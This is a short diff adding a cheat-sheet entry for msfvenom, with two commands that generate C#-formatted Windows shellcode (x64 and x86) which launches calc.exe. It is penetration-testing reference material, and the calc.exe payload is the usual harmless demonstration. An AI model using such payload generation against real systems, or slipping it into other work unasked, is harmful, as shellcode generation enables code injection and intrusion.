@@ -1,0 +1,7 @@
+% msfvenom
+
+# generate shellcode to execute calc.exe on x64
+msfvenom -p windows/x64/exec CMD="calc.exe" -f csharp
+
+# generate shellcode to execute calc.exe on x86
+msfvenom -p windows/exec CMD="calc.exe" -f csharp
